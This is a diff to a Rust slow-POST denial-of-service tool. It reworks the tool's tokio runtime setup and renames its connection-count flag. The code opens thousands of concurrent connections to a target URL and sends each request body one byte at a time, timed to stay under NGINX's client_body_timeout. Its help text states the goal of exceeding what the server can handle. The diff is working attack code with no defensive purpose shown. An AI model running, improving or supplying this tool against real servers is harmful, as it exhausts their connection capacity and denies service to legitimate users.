@@ -16,7 +16,6 @@ extern crate native_tls;
 
 extern crate tokio;
 use tokio::net::TcpStream;
-use tokio::runtime::Runtime;
 
 extern crate tokio_timer;
 use tokio_timer::*;
@@ -47,9 +46,9 @@ fn main() {
              .value_name("SECONDS")
              .long("interval")
              .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
-        .arg(Arg::with_name("connections-count")
+        .arg(Arg::with_name("connections")
              .value_name("INTEGER")
-             .long("connections-count")
+             .long("connections")
              .help("Number of simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
@@ -62,7 +61,7 @@ fn main() {
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
-    let max_connections_count: usize = value_t!(arguments, "connections-count", usize).unwrap_or(2048);
+    let max_connections_count: usize = value_t!(arguments, "connections", usize).unwrap_or(2048);
 
     let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
     let addr = parsed_url.to_socket_addrs().unwrap().next().unwrap();
@@ -72,12 +71,9 @@ fn main() {
 
     let live_connections = Arc::new(AtomicUsize::new(0));
     let connection_number = AtomicUsize::new(0);
-    let mut runtime = Runtime::new().unwrap();
-    let handle = runtime.executor();
     let cycle = Interval::new_interval(Duration::from_millis(1)).for_each({
         let live_connections = Arc::clone(&live_connections);
         // let connection_number = connection_number.clone();
-        let handle = handle.clone();
         move |_| {
             if live_connections.load(Ordering::Acquire) >= max_connections_count { return Ok(()) };
             connection_number.fetch_add(1, Ordering::Acquire);
@@ -114,7 +110,7 @@ fn main() {
                     }).map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e)) })
                 });
             live_connections.fetch_add(1, Ordering::Acquire);
-            handle.spawn(connection.map_err({
+            tokio::spawn(connection.map_err({
                 let live_connections = Arc::clone(&live_connections);
                 move |e| {
                     live_connections.fetch_sub(1, Ordering::Acquire);
@@ -132,7 +128,9 @@ fn main() {
     })
     .map_err(move |e| println!("Cannot spawn live connetions print task. Reason: {}", e));
 
-    runtime.spawn(cycle);
-    runtime.spawn(live_stats);
-    let _runtime_wait = runtime.shutdown_on_idle().wait();
+    tokio::run(futures::future::lazy(|| {
+        tokio::spawn(cycle);
+        tokio::spawn(live_stats);
+        Ok(())
+    }));
 }
